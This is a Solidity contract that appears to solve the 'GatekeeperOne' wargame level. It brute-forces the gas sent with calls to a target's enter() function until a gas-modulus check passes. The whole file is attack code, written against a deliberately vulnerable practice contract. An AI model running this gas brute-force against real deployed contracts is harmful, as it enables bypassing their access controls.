// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "hardhat/console.sol";

interface IGateKeeperOne {
    function enter(bytes8 _gateKey) payable external returns (bool) ;
}

contract GateKeeperOneAttacker{
    
    function attack(address _targetAddress, bytes8 _key) public{
        for(uint i = 0; i < 8191; i++) {
            uint _gasAmount = 8191*4 + i;
            try IGateKeeperOne(_targetAddress).enter{gas:_gasAmount}(_key){
                console.log(i);
                return;
            }
            catch (bytes memory b){
                console.log("There was an error");
            }
            
        }
    }
   
}